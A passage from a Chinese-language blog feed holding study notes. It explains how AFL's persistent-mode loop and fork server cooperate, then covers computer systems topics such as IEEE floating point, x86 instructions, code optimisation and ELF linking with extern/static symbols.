class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> __afl_persistent_loop(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_cnt) &#123;<br><br>  <span class="hljs-type">static</span> u8  first_pass = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">static</span> u32 cycle_cnt;<br><br>  <span class="hljs-keyword">if</span> (first_pass) &#123;<br><br>    <span class="hljs-comment">/* Make sure that every iteration of __AFL_LOOP() starts with a clean slate.</span><br><span class="hljs-comment">       On subsequent calls, the parent will take care of that, but on the first</span><br><span class="hljs-comment">       iteration, it&#x27;s our job to erase any trace of whatever happened</span><br><span class="hljs-comment">       before the loop. */</span><br><br>    <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>      <span class="hljs-built_in">memset</span>(__afl_area_ptr, <span class="hljs-number">0</span>, MAP_SIZE);<br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    cycle_cnt  = max_cnt;<br>    first_pass = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (is_persistent) &#123;<br><br>    <span class="hljs-keyword">if</span> (--cycle_cnt) &#123;<br><br>      <span class="hljs-built_in">raise</span>(SIGSTOP);<br><br>      __afl_area_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>      __afl_prev_loc = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-comment">/* When exiting __AFL_LOOP(), make sure that the subsequent code that</span><br><span class="hljs-comment">         follows the loop is not traced. We do that by pivoting back to the</span><br><span class="hljs-comment">         dummy output region. */</span><br><br>      __afl_area_ptr = __afl_area_initial;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>首先在main函数之前读取共享内容，然后以当前进程为fork server，去和AFL fuzz通信。</p></li><li><p>当AFL fuzz通知进行一次fuzz，由于此时child_stopped为0，则fork server先fork出一个子进程。</p></li><li><p>这个子进程会很快执行到<code>__AFL_LOOP</code>包围的代码，因为是第一次执行loop，所以会先清空<code>__afl_area_ptr</code>和设置<code>__afl_prev_loc</code>为0，并向共享内存的第一个元素写一个值，然后设置循环次数1000，随后返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI。</p></li><li><p>然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，此时将循环次数减一，变成999，然后发出信号<code>SIGSTOP</code>来让当前进程暂停，因为我们设置了WUNTRACED，所以waitpid函数就会返回，fork server将继续执行。</p></li><li><p>fork server在收到<code>SIGSTOP</code>信号后就知道fuzzAPI已经被成功执行结束了，就设置child_stopped为1，并告知AFL fuzz</p></li><li><p>然后当AFL fuzz通知再进行一次fuzz的时候，fork server将不再需要去fork出一个新的子进程去进行fuzz，只需要恢复之前的子进程继续执行，并设置child_stopped为0</p></li><li><p>因为我们是<strong>相当于重新执行一次程序</strong>，所以将<code>__afl_prev_loc</code>设置为0，并向共享内存的第一个元素写一个值，随后直接返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成998，并发出信号暂停。</p></li><li><p>上述过程重复执行，直到第1000次执行时，先恢复执行，然后返回1，然后执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成0，此时循环次数cnt已经被减到0，就不会再发出信号暂停子进程，而是设置<code>__afl_area_ptr</code>指向一个无关数组<code>__afl_area_initial</code>，随后将子进程执行到结束。</p></li></ul><p><strong>这是因为程序依然会向后执行并触发到instrument，这会向<code>__afl_area_ptr</code>里写值，但是此时我们其实并没有执行<code>fuzzAPI</code>，我们并不想向共享内存里写值，于是将其指向一个无关数组，随意写值。同理，在deferred instrumentation模式里，在执行<code>__afl_manual_init</code>之前，也是向无关数组里写值，因为我们将fork点手动设置，就代表在这个fork点之前的path我们并不关心。</strong></p><ul><li><p>重新整理一下上面的逻辑</p><ul><li>loop第一次执行的时候，会初始化，然后返回1，执行一次fuzzAPI，然后cnt会减到999，然后抛出信号暂停子进程。</li><li>loop第二次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到998，然后抛出信号暂停子进程。</li><li>loop第1000次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到0，然后就设置指向无关数组，返回0，while循环结束，程序也将执行结束。</li></ul></li><li><p>此时fork server将不再收到SIGSTOP信号，于是child_stopped仍为0。</p></li><li><p>所以当AFL fuzz通知fork server再进行一次fuzz的时候，由于此时child_stopped为0，则fork server会先fork出一个子进程，然后后续过程和之前一样了。</p></li></ul><p>涉及 编译时的 __AFL_LOOP 宏展开，以及宏内定义的  __afl_persistent_loop( ) 函数</p><p>参考：</p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p>内3.3.2部分</p><p>回到 xfuzz 关系的分析</p><p>C++语法：</p><p>throw，try，catch</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统</title>
    <link href="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统"><a href="#计算机系统" class="headerlink" title="计算机系统"></a>计算机系统</h1><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><h3 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h3><p>IEEE 浮点标准用 <code>V = (-1)^S X M X 2^E</code>来表示一个数：</p><ul><li>符号位：s 决定这个数为负数（ s = 1）或正数（s = 0）；</li><li>尾数： M 是一个二进制小数，其范围为 1 ~ 2 - 0，或  0 ~ 1 - 0；</li><li>阶码：E 的作用是对浮点数加权，为 2 的 E 次幂。</li></ul><p><strong>浮点数的位表示</strong><br>一个浮点数的位划分为三个字段，分别对这些值进行编码：</p><ul><li>第一个单独的符号位s直接编码s；</li><li>k 位的阶码字段 exp = … 编码 E；</li><li>n 位小数字段编码尾数 M 。</li></ul><p><strong>单精度字段分配</strong><br>s、exp、frac 字段分别为 1，8，23位；<br><strong>双精度字段分配</strong><br>s、exp、frac 字段分别为 1， 11， 52位。</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p1.png"></p><p><strong>规格化的值</strong></p><ul><li>exp 的位模式不全为0 也不全为1时。</li><li>阶码字段被解释为以偏置（biased）表示的有符号整数。即 E = e - Bias， e 是无符号数，Bias是 2^(k-1) - 1。（单精度 Bias 为127，双精度为 1023）</li><li>frac是小数值，取值是 [0 , 1)。</li><li>尾数定义为 <strong>M = 1 + f</strong>。</li></ul><p>举个例子：</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p2.png"></p><p>其过程：</p><ul><li>先化为二进制；</li><li>然后数最高位的阶E；</li><li>阶码 exp = E + Bias（127或1023）；</li><li>阶码 exp 化为二进制；</li><li>将原二进制数中第一个1去除后，将剩下部分补入尾数，右侧补0补齐。</li></ul><p><strong>非规格化值</strong></p><ul><li>exp全为0；</li><li>阶码 E = 1 - Bias （ 为了非规格化与规格化值之间平滑过渡）</li><li>尾数 <strong>M = 0.xxxxxxx</strong></li></ul><p>如：</p><ul><li>exp = 000000..0，frac = 000000..00，此时值为0，符号位决定 +，- 0；</li><li>exp = 000000..0，frac != 000000..00，此时为非常接近0的数。</li></ul><p><strong>特殊值</strong><br>判断条件：exp = 全1；</p><ul><li>exp = 全1，frac = 全0：表示无穷大，符号位决定正无穷或负无穷。</li><li>exp = 全1，frac 不是全0；表示这不是一个数。</li></ul><p>总结如下：<br><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p3.png"></p><p><strong>舍入</strong></p><p>向偶数舍入，即1.4会舍入为1，1.6舍入为2，<strong>1.5舍入为2，-1.5舍入为-2</strong>，使最低有效位为偶数。<br>二进制小数舍入：<br>若需要舍入至小数点后2位，先看第三位及以后，是否为中间值，即仅仅第三位为1，后面位全为0。<br>若是中间值，将第二位舍入为0，不是中间值，去向更靠近的一方。</p><p><strong>浮点数运算</strong><br><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p4.png"></p><p>即</p><ul><li>符号位亦或<code>^</code></li><li>尾数相乘</li><li>阶码E相加</li></ul><p>若</p><ul><li>M &gt;= 2 ， M 右移一位，E = E + 1</li><li>若 E 超出范围，溢出</li><li>将 M 舍入到 frac 的位数范围。</li></ul><h1 id="第三章-程序的机器级执行"><a href="#第三章-程序的机器级执行" class="headerlink" title="第三章 程序的机器级执行"></a>第三章 程序的机器级执行</h1><ul><li>mov系列指令：</li><li>movb/w/l：移动字节、字、双字</li><li>movsbw：符号拓展后，字节移动到字。</li><li>movzbw：零拓展后，字节移动到字。</li></ul><p>imull/mull<br>要求其中一个操作数在eax中，调用如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">imull</span> <span class="hljs-number">8</span>(%ebp)<br></code></pre></td></tr></table></figure><p>即最后一个参数与eax中的值相乘，乘积存放在寄存器 edx （高32位）和 eax（低32位）中。</p><p>cltd指令：将被除数拓展到 edx，eax 中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">movl <span class="hljs-number">8</span>(%ebp),%eax <span class="hljs-regexp">//</span> load x<br>cltd <span class="hljs-regexp">//</span> extend into edx<br>idivl <span class="hljs-number">12</span>(%ebp) <span class="hljs-regexp">//</span> divide by y<br></code></pre></td></tr></table></figure><p>条件码寄存器：<br>CF : 进位标志。最高位产生进位，无符号数溢出；<br>ZF : 零标志。最近操作结果为0；<br>SF : 符号标志。最近操作结果为负；<br>OF : 溢出标志。最近操作补码溢出。</p><p>lea 指令不会改变任何条件码。</p><p>cmp 指令： 只改变条件码，除此之外，其与 SUB 指令完全一样。<br>test 指令：只改变条件码，其他操作与 AND 一样。</p><h1 id="第五章-程序性能优化"><a href="#第五章-程序性能优化" class="headerlink" title="第五章 程序性能优化"></a>第五章 程序性能优化</h1><h2 id="性能的度量"><a href="#性能的度量" class="headerlink" title="性能的度量"></a>性能的度量</h2><p><strong>CPE（Cycles Per Element）</strong>每元素的周期数，执行一个元素需要多少个时钟周期。</p><p><strong>时钟周期</strong>：CPU完成一个最基本动作的时间（对应一个电平信号宽度）</p><h2 id="高级语言层面的优化"><a href="#高级语言层面的优化" class="headerlink" title="高级语言层面的优化"></a>高级语言层面的优化</h2><h3 id="将函数移出循环外"><a href="#将函数移出循环外" class="headerlink" title="将函数移出循环外"></a>将函数移出循环外</h3><p>例如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for ( i <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <span class="hljs-comment">; i &lt; vec_length(v); i++ )</span><br>&#123;<br>    ....<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以将</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">i</span> &lt; <span class="hljs-function"><span class="hljs-title">vec_length</span>(<span class="hljs-variable">v</span>)</span><br></code></pre></td></tr></table></figure><p>单独列出，以 len 表示</p><h3 id="消除不必要的内存引用"><a href="#消除不必要的内存引用" class="headerlink" title="消除不必要的内存引用"></a>消除不必要的内存引用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(....)<br>&#123;<br>    *dest = *dest OP data[i]<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码一直在访问 <code>dest</code>指向的内存，可以考虑将这个改为一个循环内使用的局部变量（寄存器中）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">acc</span> <span class="hljs-operator">=</span> acc OP data[i]<br></code></pre></td></tr></table></figure><h2 id="机器层面的代码优化"><a href="#机器层面的代码优化" class="headerlink" title="机器层面的代码优化"></a>机器层面的代码优化</h2><p><strong>指令的执行过程</strong>：</p><ul><li>取指令（Instruction Fetch，IF）阶段：将一条指令从主存中取到指令寄存器的过程。程序计数器PC中的数值，用来指示下一条指令在主存中的位置。当一条指令被取出后，PC中的数值将根据指令字长度而自动递增；</li><li>指令译码（Decode）阶段：取出指令后，计算机立即进入指令译码阶段，指 令译码器按照预定的指令格式，对取回的指令进行拆分和解释，识别区分出 不同的指令类别以及各种获取操作数的方法；</li><li>取操作数；</li><li>指令执行：此阶段的任务是完成指令所规定的各种操作，具体实现指令 的功能（分支、乘除、加法、加载和写存储器等）。为此，CPU的不同部分 被连接起来，以执行所需的操作；</li><li>写回：将操作结果写入存储器或寄存器。</li></ul><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>将原本逐个递增的循环，改为每次加2，循环内语句也增加一倍。</p><h3 id="两路并行"><a href="#两路并行" class="headerlink" title="两路并行"></a>两路并行</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">acc</span> = (acc <span class="hljs-type">OP</span> <span class="hljs-class"><span class="hljs-keyword">data</span>[i]) <span class="hljs-type">OP</span> <span class="hljs-keyword">data</span>[i+1]</span><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">acc0</span> = acc0 + data[i]<span class="hljs-comment">;</span><br><span class="hljs-attr">acc1</span> = acc1 + data[i+<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>最后res = acc0 + acc1；</p><h3 id="重新结合变换"><a href="#重新结合变换" class="headerlink" title="重新结合变换"></a>重新结合变换</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">acc</span> = (acc <span class="hljs-type">OP</span> <span class="hljs-class"><span class="hljs-keyword">data</span>[i]) <span class="hljs-type">OP</span> <span class="hljs-keyword">data</span>[i+1]</span><br><br><span class="hljs-title">acc</span> = acc <span class="hljs-type">OP</span>（<span class="hljs-class"><span class="hljs-keyword">data</span>[i] <span class="hljs-type">OP</span> <span class="hljs-keyword">data</span>[i+1]）</span><br></code></pre></td></tr></table></figure><h1 id="第六章-存储器层次结构"><a href="#第六章-存储器层次结构" class="headerlink" title="第六章 存储器层次结构"></a>第六章 存储器层次结构</h1><h2 id="随机访问寄存器（RAM）"><a href="#随机访问寄存器（RAM）" class="headerlink" title="随机访问寄存器（RAM）"></a>随机访问寄存器（RAM）</h2><p><strong>随机访问存储器（Random-Access Memory，RAM）</strong></p><p>分为以下两类：</p><ul><li>SRAM 即静态随机访问存储器；</li><li>DRAM 即动态随机访问存储器。</li></ul><p>静态比动态<strong>更快</strong>，但也<strong>更贵</strong>。</p><h3 id="SRAM"><a href="#SRAM" class="headerlink" title="SRAM"></a>SRAM</h3><p>SRAM 是将每个位存储在一个<strong>双稳态的（bistable）</strong>存储器中。每一个时刻，其状态只有可能是二者之一。</p><h3 id="DRAM"><a href="#DRAM" class="headerlink" title="DRAM"></a>DRAM</h3><p>DRAM 将每个位存储为对一个电容充电。每个单元由一个电容和一个访问晶体管组成。</p><h1 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><h3 id="extern-关键字"><a href="#extern-关键字" class="headerlink" title="extern 关键字"></a>extern 关键字</h3><p><strong>对于变量</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> a; <span class="hljs-comment">// 声明一个全局变量 a</span><br><span class="hljs-type">int</span> a; <span class="hljs-comment">// 定义一个全局变量 a</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> a =<span class="hljs-number">0</span> ; <span class="hljs-comment">// 定义一个全局变量 a 并给初值，可以被外部引用。</span><br><span class="hljs-type">int</span> a =<span class="hljs-number">0</span>;    <span class="hljs-comment">// 定义一个全局变量 a, 并给初值，可以被外部引用。</span><br></code></pre></td></tr></table></figure><p>也就是说，<code>extern int a</code>是一个声明，其它的均为定义</p><ul><li><p>声明：不需要为变量分配内存空间；</p></li><li><p>定义：要为变量分配内存空间；</p></li></ul><p>那么，如果要引用一个全局变量的时候，就必须要声明<code>extern int a</code> or <code>extern a</code>，否则会认为是定义。</p><p><strong>对于函数</strong></p><p>函数，对于函数也一样，也是定义和声明，定义的时候用extern，说明这个函数是可以被外部引用的，声明的时候用extern说明这是一个声明。 但由于函数的定义和声明是有区别的，定义函数要有函数体，声明函数没有函数体(还有以分号结尾)，所以函数定义和声明时都可以将extern省略掉，反正其他文件也是知道这个函数是在其他地方定义的，所以不加extern也行。两者如此不同，所以省略了extern也不会有问题。</p><p><strong>总结</strong></p><ul><li>对于一个文件中调用另一个文件的全局变量，因为全局变量一般定义在原文件.c中，我们不能用#include包含源文件而只能包含头文件，所以常用的方法是用<code>extern int a</code>来声明外部变量。 另外一种方法是可以是在<code>a.c</code>文件中定义了全局变量<code>int global_num</code> ，可以在对应的<code>a.h</code>头文件中写<code>extern int global_num </code>，这样其他源文件可以通过<code>include a.h</code>来声明它是外部变量就可以了。</li><li>还有变量和函数的不同举例<code>int fun();</code>和 <code>extern int fun();</code> 都是声明(定义要有实现体)。 用 <code>extern int fun() </code>只是更明确指明是声明而已。而 <code>int a</code>; 是定义 <code>extern int a;</code> 是声明。</li></ul><h3 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h3><p>当我们同时编译多个文件时，所有未加 <code>static</code> 前缀的全局变量和函数都具有<strong>全局可见性</strong>。</p><p><strong>隐藏</strong></p><p>当变量、函数的定义加上 static 关键字后，其余的文件便看不见他们了；利用这一特性可以在不同的文件中定义同名函数和同名变量，而不必担心命名冲突。</p><p><strong>对于函数来讲，static 的作用仅限于隐藏</strong></p><p><strong>保持变量内容持久</strong></p><p>存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> count = <span class="hljs-number">10</span>;    <span class="hljs-comment">// 事实上此赋值语句从来没有执行过</span><br>    <span class="hljs-keyword">return</span> count--;<br>&#125;<br><br><span class="hljs-type">int</span> count = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;global\t\tlocal static\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(; count &lt;= <span class="hljs-number">10</span>; ++count)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t\t%d\n&quot;</span>, count, fun());    <br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序的运行结果是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">global</span>          local static<br><br><span class="hljs-attribute">1</span>               <span class="hljs-number">10</span><br><br><span class="hljs-attribute">2</span>               <span class="hljs-number">9</span><br><br><span class="hljs-attribute">3</span>               <span class="hljs-number">8</span><br><br><span class="hljs-attribute">4</span>               <span class="hljs-number">7</span><br><br><span class="hljs-attribute">5</span>               <span class="hljs-number">6</span><br><br><span class="hljs-attribute">6</span>               <span class="hljs-number">5</span><br><br><span class="hljs-attribute">7</span>               <span class="hljs-number">4</span><br><br><span class="hljs-attribute">8</span>               <span class="hljs-number">3</span><br><br><span class="hljs-attribute">9</span>               <span class="hljs-number">2</span><br><br><span class="hljs-attribute">10</span>              <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以看到，加了 static 那一行的语句仅执行了一次，也就是第一次。</p><p><strong>默认初始化为0</strong></p><h2 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h2><h3 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h3><p>程序中有<strong>定义</strong>和<strong>引用</strong>的符号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">()</span> &#123;…&#125; <span class="hljs-comment">/* 定义符号swap */</span><br>swap(); <span class="hljs-comment">/* 引用符号swap */</span><br><span class="hljs-type">int</span> *xp = &amp;x; <span class="hljs-comment">/* 定义符号 xp, 引用符号 x */</span><br></code></pre></td></tr></table></figure><p>编译器将符号的定义储存在一个符号表（symbol table）中</p><ul><li>符号表是一个条目数组；</li><li>每个条目包含符号的名称、长度和保存位置。</li></ul><h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><ul><li><strong>合并</strong>：将多个代码节和数据节分别合并成一个代码节和数据节；</li><li><strong>定义位置修改</strong>：将多个.o文件中的符号定义，从相对位置重定位到单个可执行文件中最终的绝对存储器位置；</li><li><strong>引用指向修改</strong>：更新对这些符号的所有引用指向它们的新位置。</li></ul><h3 id="三种目标文件"><a href="#三种目标文件" class="headerlink" title="三种目标文件"></a>三种目标文件</h3><ul><li><strong>可重定位目标文件（xxx.o file）</strong>：包含的代码和数据可以在链接时与其他可重定位目标文件合并起来。每个.o 文件由对应的.c文件生成，<strong>代码和数据地址都从0开始</strong>；</li><li>**共享的目标文件 (.so file)**：特殊的可重定位目标文件，可以在加载或运行时被动态加载到存储器并链接，Windows 中叫做动态链接库(Dynamic Link Libraries, DLLs)；</li><li><strong>可执行目标文件 (a.out file)<strong>：代码和数据地址为</strong>虚拟地址空间</strong>中的地址</li></ul><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p5.png"></p><p>上图是可重定位目标文件与可执行目标文件的对比。</p><h2 id="可重定位目标文件格式"><a href="#可重定位目标文件格式" class="headerlink" title="可重定位目标文件格式"></a>可重定位目标文件格式</h2><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p6.png"></p><ul><li><p>ELF header：字长、字节序（大端/小端）、文件类型 (.o, exec, .so)、 机器类型（如 IA-32）等（readelf -h）；</p></li><li><p>.text section：已编译的机器代码；</p></li><li><p>.rodata section：只读数据，比如 printf 字符串， switch 跳转表等；</p></li><li><p>.data section：已初始化的全局变量。注意局部变量运行时保存在<strong>栈</strong>中；</p></li><li><p>.bss section：未初始化全局变量，仅是占位符；不占用实际磁盘空间；区分初始化和非初始化是为了空间效率；</p></li><li><p>symtab section：符号表（readelf -s）；函数和全局/静态变量名，不含局部变量条目；</p></li><li><p>.rel.text section：.text 节的重定位信息（readelf -r）；用于重新修改代码段的指令中的地址信息；</p></li><li><p>.rel.data section：.data 节的重定位信息；用于对被模块引用或定义的全局变量进行重定位的信息；</p></li><li><p>.debug section (.line section)：调试符号表；</p></li><li><p>.strtab section：包含.symtab节中符号及section节名；</p></li><li><p>Section header table（节头表）：每个section的名称、偏移和大小（readelf -S）；</p></li></ul><h2 id="可执行目标文件的格式"><a href="#可执行目标文件的格式" class="headerlink" title="可执行目标文件的格式"></a>可执行目标文件的格式</h2><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p7.png"></p><p>与.o文件的不同：</p><ul><li>ELF头中字段e_entry给出执行程序时第一条指 令的地址，而在可重定位文件中，此字段为0；</li><li>多一个程序头表（Program Headers table） 是一个结构体数组：偏移量，虚存地址，物理 地址，段大小，地址对齐等信息（readelf -l）；</li><li>多一个.init节，用于定义_init函数，该函数用来 进行可执行目标文件开始执行时的初始化工作；</li><li>少两.rel节（无需重定位）。</li></ul><h2 id="符号和符号表"><a href="#符号和符号表" class="headerlink" title="符号和符号表"></a>符号和符号表</h2><ul><li><p>**Global symbols ** 模块内部定义的全局符号，不带static</p><ul><li>由模块m定义并能被其他模块引用的符号。 </li><li>例如，non-static C函数和non-static全局变量 ，main.c 中的全局变量名buf</li></ul></li><li><p><strong>External symbols</strong>  外部定义的全局符号</p><ul><li>由其他模块定义并被模块m引用的全局符号；</li></ul></li><li><p><strong>Local symbols</strong>（本模块的本地符号，带static）</p><ul><li>仅由模块m定义和引用的本地符号。</li><li>例如，在模块m中定义的static C函数和static全局变量。</li></ul></li></ul><p><strong>注意，要是符号！！</strong>局部变量不是符号。（函数名都是）</p><h3 id="其他本地（Local）符号"><a href="#其他本地（Local）符号" class="headerlink" title="其他本地（Local）符号"></a>其他本地（Local）符号</h3><ul><li>non-static C局部变量与static C局部变量<ul><li>non-static C局部变量：存储在堆栈中；</li><li>static C局部变量：存储在.bss或.data中；</li></ul></li></ul><h2 id="深入理解-static-修饰符"><a href="#深入理解-static-修饰符" class="headerlink" title="深入理解 static 修饰符"></a>深入理解 static 修饰符</h2><ul><li>隐藏：把函数和变量隐藏在模块内部（C++/JAVA private）；</li><li>存储区：把变量存放在静态存储区，具备持久性，默认值0；</li><li>static函数<ul><li>函数的定义和声明默认是extern。当定义成静态函数后只在当前文件(模块)中可见，不能被其他文件所用；</li><li>其他文件中可以定义同名函数，不会发生冲突；</li></ul></li><li>static全局变量<ul><li>存储区：.data或.bss，只初始化一次；</li><li>作用域：定义该变量的源文件内有效， 在同一源程序的其它源文件中不可见（不能使用它）；</li><li>其他文件中可以使用同名变量，不会发生冲突。</li></ul></li><li>static局部变量<ul><li>存储区：.data或.bss，只初始化一次，具备持久性（下一次依据上一次结果值 ）；</li><li>作用域：<strong>当前函数</strong>。</li></ul></li></ul><h2 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h2><ul><li>编译时，编译器向汇编器输出的每个全局符号（强符号 或 弱符号）<ul><li>Strong：函数名和已初始化的全局变量名是强符号定义；</li><li>Weak：未初始化的全局变量名是弱符号定义。</li></ul></li></ul><h3 id="符号解析规则"><a href="#符号解析规则" class="headerlink" title="符号解析规则"></a>符号解析规则</h3><ul><li>Rule 1: 强符号不能多次定义；</li><li>Rule 2: 强符号覆盖同名的弱符号（若一个符号被定义为一次强符号和多 次弱符号，则按强符号定义为准）；</li><li>Rule 3: 若有多个弱符号定义，则选择其中任意一个；</li></ul><h2 id="重定位条目"><a href="#重定位条目" class="headerlink" 